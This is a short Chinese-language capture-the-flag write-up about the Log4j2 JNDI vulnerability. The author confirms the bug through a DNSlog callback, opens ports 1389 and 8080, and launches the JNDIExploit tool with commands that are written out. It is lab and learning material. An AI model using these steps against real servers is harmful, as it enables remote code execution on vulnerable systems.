前言

“核弹级”漏洞log4jshell爆出也挺久了，靶场这个也写了一段时间了，本人有幸拿了七血（应该是大佬不屑于做buu的题吧），log4j2漏洞原理也研究过一段时间，过段时间写个分析出来吧，java萌新，大佬绕道

刷新dnslog平台，发现已被记录，说明有此漏洞


漏洞利用

服务器启动JNDI服务


防火墙开放 1389 和 8080端口
打开JNDIExploit文件夹


java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1//-i为服务器外网地址


工具详细说明

java -jar JNDIExploit-1.2-SNAPSHOT.jar -u
